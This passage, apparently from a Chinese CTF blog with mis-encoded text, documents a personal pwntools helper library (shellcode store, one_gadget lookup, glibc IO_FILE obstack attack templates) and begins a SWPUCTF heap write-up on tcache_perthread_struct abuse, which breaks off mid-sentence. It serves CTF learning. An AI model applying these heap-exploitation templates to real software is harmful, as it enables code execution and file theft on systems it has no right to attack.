äº†ç®­å¤´å’Œå­—ä½“é¢œè‰²æ•ˆæœï¼Œå¯ä»¥æ›´æ¸…æ¥šçš„æ‰“å°æ‰€éœ€è¦çš„ä¿¡æ¯</p><p>ä½¿ç”¨èŒƒä¾‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts=<span class="number">123456</span></span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br></pre></td></tr></table></figure><h3 id="log-addr"><a href="#log-addr" class="headerlink" title="log_addr"></a>log_addr</h3><p>å¦‚æœä½ ä»…ä»…æ˜¯æƒ³çœ‹ä¸€ä¸‹å˜é‡å¯¹åº”çš„å€¼æ˜¯å¦æ˜¯ä½ éœ€è¦çš„é‚£ä¸ªåœ°å€ï¼ŒåŒæ—¶æ„Ÿè§‰ä¸Šé¢è¿™ä¸ªlogå‡½æ•°å¤ªéº»çƒ¦è¿˜éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆä½ ä¸å¦¨è¯•è¯•log_addrå‡½æ•°ã€‚</p><p>ä½œç”¨:log_addræ˜¯ä¸“é—¨ä¸ºå±•ç¤ºåœ°å€è®¾è®¡çš„ï¼ˆå› ä¸ºå®ƒä¼šè‡ªåŠ¨å°†å˜é‡ä»¥16è¿›åˆ¶çš„å½¢å¼æ‰“å°)</p><p>ä¼˜ç‚¹ï¼š<strong>åªä¼ ä¸€ä¸ªå˜é‡åå­—å³å¯åŒæ—¶è¿”å›çš„æ˜¯ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºçš„å˜é‡</strong>ï¼Œä½†æ˜¯æ²¡æœ‰logå‡½æ•°çµæ´»ã€‚</p><p>ä½¿ç”¨å‰æï¼šä½ è¦ç¡®ä¿å˜é‡æ˜¯intç±»å‹çš„ï¼Œé‚£ä¹ˆä½ ä»…ä»…ä¼ å…¥**å­—ç¬¦å‹çš„<u>å˜é‡åå­—</u>**ï¼ˆä¸æ˜¯å˜é‡ï¼‰</p><p>ä½¿ç”¨èŒƒä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_addr=123456</span><br><span class="line">log_addr(&#x27;puts_addr&#x27;)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ•ˆæœï¼š<br><img src="/../img/MRYBXkvlcL5Kj6t.png"></p><h3 id="log-info"><a href="#log-info" class="headerlink" title="log_info"></a>log_info</h3><p>å¦‚æœä»…ä»…æ˜¯æ‰“å°ä¸€ä¸ªå‚æ•°çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨log_infoå‡½æ•°ã€‚</p><p>ä½œç”¨ï¼šæ‰“å°è°ƒè¯•ä¿¡æ¯</p><p>ä¼˜ç‚¹ï¼šå‰é¢åŠ äº†[*]ï¼Œä½¿è°ƒè¯•ä¿¡æ¯æ›´åŠ æ˜æ˜¾ï¼Œè®©ä½ æ›´å¿«çš„æ‰¾åˆ°ä½ æƒ³çœ‹è§çš„ä¿¡æ¯ã€‚</p><p>é€‚ç”¨æƒ…å†µï¼šæ¯”å¦‚ä½ å‘ç°u32(p.recv(4))å¾—åˆ°çš„åœ°å€ä¸å¯¹ï¼Œä½ æƒ³è¦çœ‹çœ‹p.recv()åˆ°åº•æ¥æ”¶äº†ä»€ä¹ˆï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥è¿™ä¹ˆå†™log_info(p.recv())ã€‚</p><p>ä½¿ç”¨èŒƒä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_info(p.recv())</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ•ˆæœï¼š</p><p><img src="/../img/jP81hQByfWJlrTH.png" alt="image-20220729201555971"></p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>ä½œç”¨ï¼šåœ¨è„šæœ¬ä¸­ä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•<br>ä¼˜ç‚¹ï¼š1ã€å¦‚æœä½¿ç”¨tmuxï¼Œå¯ä»¥ç›´æ¥åˆ†ä¸‰å±ï¼Œæ•ˆæœå¦‚ä¸‹å›¾ã€‚æ‚¨ä»…ä»…åªéœ€è¦åœ¨è„šæœ¬ä¸­åŠ å…¥è¿™ä¸ªå‡½æ•°ï¼Œè¿è¡Œè„šæœ¬çš„æ—¶å€™å°±å¯ä»¥è‡ªåŠ¨åˆ†å‡ºä¸‰å—å±å¹•(è°ƒè¯•å…·ä½“ä¿¡æ¯å å±å¹•çš„å³ä¾§ï¼Œå·¦ä¸Šæ˜¯è„šæœ¬çš„debugæ‰§è¡Œä¿¡æ¯ï¼Œå·¦ä¸‹åˆ™å¯ä»¥ç»§ç»­ä½¿ç”¨)ï¼Œå·¦ä¸‹è§’çš„åŒºåŸŸå®Œå…¨å¯ä»¥å»å¯¹ç€è„šæœ¬è¿›è¡Œè°ƒè¯•ã€‚<br><img src="/../img/7cIP89qwUyT2umG.png"></p><p>2ã€å¯ä»¥å¾ˆç®€æ´çš„è¾“å…¥åœ°å€ï¼Œå³å¯å®Œæˆä¸‹æ–­ç‚¹çš„å·¥ä½œï¼ŒåŒæ—¶å¼€äº†pieä¿æŠ¤çš„è¯ï¼Œä¹Ÿå¯ä»¥æ­£å¸¸å»ä¸‹æ–­ç‚¹</p><p>ä½¿ç”¨è¯´æ˜ï¼š<br>        è¿™ä¸ªå‡½æ•°è¿˜æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„ï¼Œé€‚ç”¨äºtmuxçš„ç»ˆç«¯ï¼Œåªéœ€è¦åœ¨æœ€å¼€å§‹ä¼ é€’ä¸€ä¸‹processå‡½æ•°è¿”å›çš„å¯¹è±¡ï¼Œæ¥ç€å°±å¯ä»¥ç›´æ¥ä¸‹æ–­ç‚¹äº†ï¼ˆé»˜è®¤ä½¿ç”¨tmuxï¼‰ï¼Œå¦‚æœå¼€å¯äº†PIEä¿æŠ¤çš„è¯ï¼Œéœ€è¦å£°æ˜ä¸€ä¸‹pieï¼ˆä¹Ÿå°±æ˜¯åŠ ä¸€ä¸ªå‚æ•°â€™pieâ€™ï¼‰å³å¯ç»§ç»­ä¸‹æ–­ç‚¹ã€‚<br>        å¦‚æœä¸ä½¿ç”¨tmuxä¹Ÿæ²¡é—®é¢˜ï¼Œå¯ä»¥åŠ å…¥å‚æ•°no-tmuxå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼ˆ<strong>å¦‚æœä½¿ç”¨no-tmuxï¼Œåˆ™è¿™ä¸ªå‚æ•°å¿…é¡»æ˜¯æ”¾åœ¨ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®</strong>ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°å§‹ç»ˆæ˜¯processçš„è¿”å›å€¼ï¼‰</p><p>å¦‚æœç›´æ¥ä½¿ç”¨debug()å‡½æ•°ï¼Œå‚æ•°åªæœ‰processå‡½æ•°è¿”å›çš„å¯¹è±¡çš„è¯ï¼Œåˆ™é»˜è®¤ä½¿ç”¨tmuxç»ˆç«¯ï¼Œæ‰§è¡Œåˆ†ä¸‰å±å‘½ä»¤ï¼Œæœ€åæ‰§è¡Œgdb.attach(p)<br>PSï¼šè¿™ä¸ªå‡½æ•°å¯ä»¥æ”¾åˆ°è„šæœ¬çš„ä»»ä½•ä½ç½®ï¼ˆå¿…é¡»è¦ä¿è¯å½“å‰ä½ç½®çš„ä¸‹é¢è¿˜æœ‰ä¸€è¡Œä¸ä¼šè§¦å‘æŠ¥é”™çš„ä»£ç ï¼‰ï¼Œè¿™æ ·å¯ä»¥ä»è„šæœ¬å½“å‰çš„ä½ç½®å»å¼€å§‹è°ƒè¯•ï¼ŒåŒæ—¶é…åˆä¸‹çš„æ–­ç‚¹å¯ä»¥ä½¿è°ƒè¯•æ›´é«˜æ•ˆã€‚<br>ä½¿ç”¨èŒƒä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">debug(p,<span class="number">0x400ECD</span>,<span class="number">0x400F54</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;ä½¿ç”¨tmuxï¼Œä¸‹ä¸¤ä¸ªæ–­ç‚¹&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;no-tmux&#x27;</span>,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x248</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;ä¸ä½¿ç”¨tmuxï¼Œç¨‹åºå¼€äº†pieï¼Œç”¨åç§»æ¥ä¸‹æ–­ç‚¹&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">debug(p)</span><br><span class="line"><span class="string">&quot;&quot;&quot;ä½¿ç”¨tmuxï¼Œæ‰§è¡Œgdb.attach(p)&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>ä½œç”¨:å†™å…¥ç›®æ ‡ç¨‹åºçš„åå­—ï¼Œå°†è¿”å›p(processçš„è¿”å›å€¼),e(å½“å‰ELFæ–‡ä»¶çš„ä¿¡æ¯),libc(ELFæ–‡ä»¶æ‰€ä¾èµ–çš„libcæ–‡ä»¶çš„ä¿¡æ¯)ã€‚psï¼šå¦‚æœæ˜¯é™æ€é“¾æ¥çš„ç¨‹åºï¼Œé‚£ä¹ˆåªä¼šæ‰§è¡Œp&#x3D;processæˆ–è€…p&#x3D;remoteç„¶åç›´æ¥è¿”å›pã€‚</p><p>ä¹Ÿå°±æ˜¯ç›¸å½“äºæ‰§è¡Œäº†åŸæ¥çš„p&#x3D;process(â€˜xxxâ€™) e&#x3D;ELF(â€˜xxxâ€™) libc&#x3D;ELF(â€˜xxxâ€™)ã€‚å¦‚æœä¼ å…¥äº†ipå’Œportçš„è¯ï¼Œåˆ™ä¼šæ‰§è¡Œremote(ip,port)ä»£æ›¿åŸæœ¬çš„processã€‚è¿™æ ·å°±å¯ä»¥ç›´æ¥æ‰“è¿œç¨‹äº†</p><p>ä¼˜ç‚¹:å°†åŸæœ¬é‡å¤çš„ä»£ç å†™åœ¨äº†å‡½æ•°å†…éƒ¨ï¼Œç°åœ¨åªè¦è°ƒç”¨loadå‡½æ•°ï¼Œä¼ å…¥å‡½æ•°åå³ã€‚åŒæ—¶è¯¥å‡½æ•°ä¹Ÿè·å–äº†libcçš„ä¿¡æ¯å°†å…¶å­˜ä¸ºäº†å…¨å±€å˜é‡ï¼Œä¸ºäº†ä¹‹åè·å–one_gadgetçš„å‡½æ•°ç›´æ¥ä½¿ç”¨ã€‚</p><p>ä½¿ç”¨èŒƒä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p,e,libc=load(<span class="string">&#x27;program&#x27;</span>)<span class="comment">#è¿™æ˜¯æ‰“æœ¬åœ°ï¼ŒåŠ¨æ€é“¾æ¥çš„ç¨‹åº</span></span><br><span class="line">p=load(<span class="string">&#x27;program&#x27;</span>)<span class="comment">#è¿™æ˜¯æ‰“æœ¬åœ°ï¼Œé™æ€é“¾æ¥çš„ç¨‹åº</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;program&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28822&quot;</span>)<span class="comment">#è¿™æ˜¯æ‰“è¿œç¨‹çš„æƒ…å†µï¼Œipå’Œportåªéœ€è¦ç”¨:åˆ†éš”å¼€å³å¯ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="shellcode-store"><a href="#shellcode-store" class="headerlink" title="shellcode_store"></a>shellcode_store</h3><p>æˆ‘å°è£…äº†ä¸€äº›shellcodeæ”¾åˆ°äº†toolsé‡Œé¢ï¼Œå¯ä»¥ä½¿ç”¨shellcode_storeå‡½æ•°æ¥è¿›è¡Œä½¿ç”¨ã€‚</p><p>ä½œç”¨ï¼šå‚æ•°è®¾ç½®ä¸ºéœ€è¦çš„shellcodeç±»å‹ï¼Œè¿”å›å¯¹åº”çš„shellcode</p><p>ä½¿ç”¨èŒƒä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode=shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)<span class="comment">#è¿”å›64ä½è·å–shellçš„shellcode</span></span><br><span class="line">shellcode=shellcode_store(<span class="string">&#x27;orw_32&#x27;</span>)<span class="comment">#è¿”å›32ä½æ‰§è¡Œopen,read,writeè¯»å‡ºflagçš„shellcode</span></span><br><span class="line">shellcode=shellcode_store(<span class="string">&#x27;str_rax&#x27;</span>)<span class="comment">#è¿”å›èµ·å§‹çš„è·³è½¬å¯„å­˜å™¨ä¸ºraxçš„å­—ç¬¦å‹shellcode</span></span><br></pre></td></tr></table></figure><p>PSï¼šè·å–shellå’Œorwçš„æˆ‘éƒ½å†™äº†64ä½å’Œ32ä½çš„shellcodeï¼ˆåº”è¯¥æ˜¯æœ€çŸ­å­—èŠ‚çš„äº†ï¼‰ï¼Œçº¯å­—ç¬¦çš„shellcodeæˆ‘å‡ ä¹åªç”Ÿæˆäº†é’ˆå¯¹äºx64çš„å„ä¸ªå¯„å­˜å™¨ï¼Œå…¶ä»–æ²¡æœ‰ç”Ÿæˆé‚£ä¹ˆå¤šï¼ˆå› ä¸ºæ„Ÿè§‰å¹³å¸¸å¾ˆå°‘ç”¨åˆ°ï¼‰ï¼Œç­‰ä»¥åç”¨åˆ°æ²¡æœ‰ç”Ÿæˆè¿‡çš„å†è®°å½•ä¸Šæ¥å§ã€‚</p><h3 id="search-og"><a href="#search-og" class="headerlink" title="search_og"></a>search_og</h3><p>ä½œç”¨ï¼šä¸éœ€è¦æ‰‹åŠ¨å°†one_gadgetå·¥å…·è·å–çš„one_gadgetå†å¤åˆ¶ç²˜è´´åˆ°è„šæœ¬ä¸­äº†ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥è·å–one_gadget,å‚æ•°ä¸ºæƒ³è·å–å¯¹åº”çš„one_gadgetåœ¨åˆ—è¡¨ä¸­çš„ç´¢å¼•ã€‚</p><p>æ³¨æ„:è¿™ä¸ªå‡½æ•°ä¾èµ–äº†one_gadgetè¿™ä¸ªå·¥å…·ä»¥åŠloadå‡½æ•°ï¼Œå› æ­¤å¿…é¡»è¦ä¿è¯å½“å‰æ‹¥æœ‰one_gadgetå·¥å…·å¹¶ä¸”è„šæœ¬ä¸­ä½¿ç”¨äº†loadå‡½æ•°æ‰è¡Œã€‚</p><p>ä½¿ç”¨èŒƒä¾‹:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">one_gadget=search_og(<span class="number">1</span>)</span><br><span class="line">p.sendline(p64(one_gadget+libc_base))</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ•ˆæœï¼š<br><img src="/../img/2706180-20220821171240306-943254837.png"></p><h3 id="æ”»å‡»æ¨¡æ¿"><a href="#æ”»å‡»æ¨¡æ¿" class="headerlink" title="æ”»å‡»æ¨¡æ¿"></a>æ”»å‡»æ¨¡æ¿</h3><h4 id="obstack-attack"><a href="#obstack-attack" class="headerlink" title="obstack_attack"></a>obstack_attack</h4><p>ä½œç”¨: è¿™ä¸ªå‡½æ•°æ˜¯æå‰å¸ƒå±€å¥½çš„ä¸€ä¸ª <code>IO_FILE</code> æ¨¡æ¿ï¼ˆæ‰“çš„ <code>IO</code> é“¾æ˜¯ <code>IO_obstack_jumps</code> ä¸­ <code>_IO_obstack_xsputn</code> å‡½æ•°ï¼‰ï¼Œæ”»å‡»æ•ˆæœå¯ä»¥ä»»æ„åœ°å€æ‰§è¡Œå¹¶ä¸”å¯ä»¥æ§åˆ¶ç¬¬ä¸€ä¸ªå‚æ•°,è¿™ä¸ªå‡½æ•°çš„æœ€ç»ˆæ•ˆæœæ˜¯æ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code></p><p>é€‚ç”¨ç‰ˆæœ¬: <code>glibc 2.36</code>åŠä»¥ä¸‹</p><p>åˆ©ç”¨æ¡ä»¶:ä½¿ç”¨å‰ææ˜¯æ³„éœ² <code>libc</code> åœ°å€å’Œå †åœ°å€ å¹¶ä¸”èƒ½ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€(æœ€å¥½æ˜¯å¾€ <code>IO_list_all</code> é‡Œå†™ä¸€ä¸ªå †åœ°å€) ä¸”èƒ½ä» <code>main</code> å‡½æ•°æ­£å¸¸è¿”å›æˆ–è€…è§¦å‘ <code>exit</code> å‡½æ•°</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123; <span class="string">&#x27;system&#x27;</span>:libc_base+<span class="number">0x50d60</span> ,<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx&#125;</span><br><span class="line">libc_symbols=create_dict(dirc)</span><br><span class="line"></span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•: <code>heap_addr</code> æ˜¯å†™å…¥ <code>IO_list_all</code> ä¸­çš„å †åœ°å€( <code>chunk</code> å¤´åœ°å€)<br><code>libc_symbols</code> :æ˜¯ <code>create_dict(dict)</code> ä¼ å…¥è¿›æ¥è¿”å›å€¼ï¼ˆ <code>dirc</code> æ˜¯æ‰€éœ€çš„å‚æ•°å­—å…¸ï¼‰</p><p>è¿”å›å€¼æ˜¯æ„é€ å¥½çš„ <code>payload</code></p><h4 id="obstack-orw1-attack"><a href="#obstack-orw1-attack" class="headerlink" title="obstack_orw1_attack"></a>obstack_orw1_attack</h4><p>ä½œç”¨ï¼šè¿™ä¸ªå‡½æ•°å°±æ˜¯åœ¨ç¦ç”¨äº† <code>execve</code> æˆ–è€…æ ˆæ²¡å¯¹é½æ—¶ä½¿ç”¨çš„,æ”»å‡»æ•ˆæœå°±æ˜¯æ‰§è¡Œå¸¸è§„çš„ <code>orw</code>,å’Œ<code>obstack_attack</code> ä¸åŒçš„å°±æ˜¯å­—å…¸ä¸­å¤šäº†å‡ ä¸ªæˆå‘˜</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123;<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;open&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;read&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;write&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;svcudp_reply&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;add_rsp&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;leave_ret&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rsi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdx_xxx&#x27;</span>:libc_base+xxx &#125;</span><br><span class="line"></span><br><span class="line">libc_symbols=create_dict(dirc) </span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•: <code>heap_addr</code> æ˜¯å†™å…¥ <code>IO_list_all</code> ä¸­çš„å †åœ°å€( <code>chunk</code> å¤´åœ°å€)<br><code>libc_symbols</code> :æ˜¯ <code>create_dict(dict)</code> ä¼ å…¥è¿›æ¥è¿”å›å€¼ï¼ˆ <code>dirc</code> æ˜¯æ‰€éœ€çš„å‚æ•°å­—å…¸ï¼‰</p><p>è¿”å›å€¼æ˜¯æ„é€ å¥½çš„ <code>payload</code></p><h4 id="obstack-orw2-attack"><a href="#obstack-orw2-attack" class="headerlink" title="obstack_orw2_attack"></a>obstack_orw2_attack</h4><p>è¿™ä¸ªæ˜¯ä¸Šä¸€ä¸ªçš„å‡çº§ç‰ˆ,åŒºåˆ«å°±æ˜¯å°† <code>open</code> æ¢æˆäº† <code>openat</code> ï¼ˆæœ‰æ—¶å€™å¯èƒ½æ²™ç®±ä¼šç¦ç”¨æ‰ <code>open</code>ï¼‰,å¹¶ä¸”å…³é—­æ ‡å‡†è¾“å…¥æµï¼Œå°†æ–‡ä»¶æè¿°ç¬¦ <code>0</code>  ä½œä¸º <code>flag</code> æ–‡ä»¶çš„æ–‡æè¿°ç¬¦,é¿å…æœ¬åœ°é€šäº†ï¼Œè¿œç¨‹æ‰“ä¸é€š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123;<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;openat&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;close&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;read&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;write&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;svcudp_reply&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;add_rsp&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;leave_ret&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rsi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdx_xxx&#x27;</span>:libc_base+xxx &#125;</span><br><span class="line">libc_symbols=create_dict(dirc)</span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•: <code>heap_addr</code> æ˜¯å†™å…¥ <code>IO_list_all</code> ä¸­çš„å †åœ°å€( <code>chunk</code> å¤´åœ°å€)<br><code>libc_symbols</code> :æ˜¯ <code>create_dict(dict)</code> ä¼ å…¥è¿›æ¥è¿”å›å€¼ï¼ˆ <code>dirc</code> æ˜¯æ‰€éœ€çš„å‚æ•°å­—å…¸ï¼‰</p><p>è¿”å›å€¼æ˜¯æ„é€ å¥½çš„ <code>payload</code></p>]]></content>
      
      
      <categories>
          
          <category> å°è¯•å¼€å‘å°å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> å°å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_p1KkHeap</title>
      <link href="/posts/a25249b0.html"/>
      <url>/posts/a25249b0.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“-amp-amp-å¯å‘ï¼š"><a href="#æ€»ç»“-amp-amp-å¯å‘ï¼š" class="headerlink" title="æ€»ç»“&amp;&amp;å¯å‘ï¼š"></a>æ€»ç»“&amp;&amp;å¯å‘ï¼š</h2><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p>é€šè¿‡è¿™é“å¯¹äºtcacheæœºåˆ¶æœ‰äº†ä¸€å®šçš„è®¤è¯†ã€‚</p><p>tcache_perthread_structç»“æ„ä½“æ˜¯ç”¨æ¥ç®¡ç†tcacheé“¾è¡¨çš„ï¼Œå®ƒçš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS64</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä½“ä¸­æœ‰ä¸¤ä¸ªæˆå‘˜å˜é‡ï¼Œä¸€ä¸ªæ˜¯64å­—èŠ‚çš„countsæ•°ç»„ã€‚è¯¥æ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½å„è‡ªå¯¹åº”äº†64ä¸ªtcacheé“¾è¡¨å…¶ä¸­ä¸€æ¡ä¸Šchunkçš„æ•°é‡(æœ€å¤§ä¸º7)ã€‚å¦ä¸€ä¸ªæˆå‘˜å˜é‡æ˜¯ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆæ•°ç»„ï¼Œè¯¥æ•°ç»„çš„å¤§å°ä¸º64*8å­—èŠ‚ï¼Œè¯¥æ•°ç»„å­˜æ”¾çš„æ˜¯æ¯æ¡tcacheé“¾è¡¨çš„å¤´æŒ‡é’ˆã€‚</p><p>è€Œè¿™ä¸ªç»“æ„ä½“ä¼šåœ¨ç¬¬ä¸€æ¬¡ç”¨æˆ·åˆ†é…å †å†…å­˜ç©ºé—´ä¹‹å‰ï¼Œä¼šè¢«ç”³è¯·å‡ºæ¥ã€‚å…¶å¤§å°ä¸º0x10+0x40+0x40*8&#x3D;0x250ã€‚</p><p>å¦‚æœæˆ‘ä»¬èƒ½å°†è¿™ä¸ªtcache_perthread_structç»“æ„ä½“ç”³è¯·å‡ºæ¥å¹¶è¿›è¡Œç¼–è¾‘ï¼Œé‚£å°±å¯ä»¥è¾¾åˆ°ä»»æ„åœ°å€ç”³è¯·(ç›´æ¥å‡­ç©ºåœ¨ç»“æ„ä½“æŒ‡é’ˆæ•°ç»„ä¸­å†™å…¥ä»»æ„åœ°å€)ï¼Œåˆæˆ–è€…æˆ‘ä»¬ç¯¡æ”¹countçš„å€¼ï¼Œè®©åŸæœ¬ä¸€ä¸ªå †åœ°å€å¯¹åº”çš„countæ˜¯1ï¼Œæˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸º7ï¼Œè¿™æ ·å†æ¬¡å°†å…¶é‡Šæ”¾æ‰ï¼Œå°±å¯ä»¥è®©å®ƒè¿›å…¥unsorted binä¸­äº†ã€‚</p><h3 id="å¯å‘ï¼š"><a href="#å¯å‘ï¼š" class="headerlink" title="å¯å‘ï¼š"></a>å¯å‘ï¼š</h3><blockquote><p>é€šè¿‡è¿™é“é¢˜ï¼Œä¹Ÿè®©æˆ‘å—åˆ°äº†ä¸€äº›å¯å‘ï¼Œæœ¬é¢˜æ˜¯å¯ä»¥æ³„éœ²å‡ºå †åœ°å€ï¼Œä»è€Œå°†tcache_perthread_structç”³è¯·å‡ºæ¥ï¼Œä½†æ˜¯æˆ‘å‘ç°è¿™é‡Œå¯ä»¥åˆ©ç”¨UAFæ‰“ä¸€ä¸ªtcache dupï¼Œç„¶åçˆ†ç ´ä¸€æ¯”ç‰¹ä½ï¼Œä¹Ÿå¯ä»¥å°†tcache_perthread_structç”³è¯·å‡ºæ¥ã€‚ç„¶åå¯¹å…¶è¿›è¡Œç¼–è¾‘ï¼Œä»è€Œè¾¾åˆ°ä»»æ„åœ°å€ç”³è¯·ï¼Œåˆæˆ–è€…æ›´æ”¹tcacheé“¾è¡¨çš„countsã€‚æœ€åæ‰“io_leakï¼Œä¹Ÿå¯ä»¥æ³„éœ²å‡ºlibcåœ°å€ï¼Œè€Œè¿™æ ·å°±ä¸éœ€è¦å­˜åœ¨æ³„éœ²å‡½æ•°äº†ã€‚é€šè¿‡æŸ¥é˜…èµ„æ–™ï¼Œå‘ç°è¿™ä½å¸ˆå‚…åœ¨2019å¹´å°±æå‡ºäº†è¿™ç§æ”»å‡»</p><p><a href="https://xz.aliyun.com/t/6828#toc-0">åˆæ¢tcache structæ”»å‡» - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p></blockquote><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220828154000077-1408719411.png"></p><p>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å…¨å¼€ï¼Œå¹¶ä¸”å¼€äº†æ²™ç®±ç¦ç”¨äº†execveï¼Œé‚£å°±è€ƒè™‘orwã€‚</p><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><h3 id="deleteå‡½æ•°ï¼š"><a href="#deleteå‡½æ•°ï¼š" class="headerlink" title="deleteå‡½æ•°ï¼š"></a>deleteå‡½æ•°ï¼š</h3><p>é€šè¿‡åˆ†æä¸‹é¢çš„deleteå‡½æ•°ï¼Œå‘ç°è¯¥å‡½æ•°å­˜åœ¨UAFæ¼æ´ï¼Œä½†æ˜¯freeæŒ‡å®šå †å—åï¼Œä¼šæŠŠè¯¥å †å—çš„sizeä½ç»™ç½®ç©ºã€‚ä¸”è¯¥å‡½æ•°åªèƒ½æ‰§è¡Œä¸‰æ¬¡ã€‚</p><p><img src="/../img/2706180-20220828154022952-102798994.png"></p><h3 id="addå‡½æ•°ï¼š"><a href="#addå‡½æ•°ï¼š" class="headerlink" title="addå‡½æ•°ï¼š"></a>addå‡½æ•°ï¼š</h3><p>é€šè¿‡åˆ†æaddå‡½æ•°ä¸­(å¦‚ä¸‹å›¾)ï¼Œå‘ç°æˆ‘ä»¬æœ€å¤§åªèƒ½ç”³è¯·0x100çš„å †å—ï¼Œå¹¶ä¸”å› ä¸ºfreeæ‰å †å—åå¹¶ä¸ä¼šè¢«ç½®ç©ºæŒ‡é’ˆå†æ 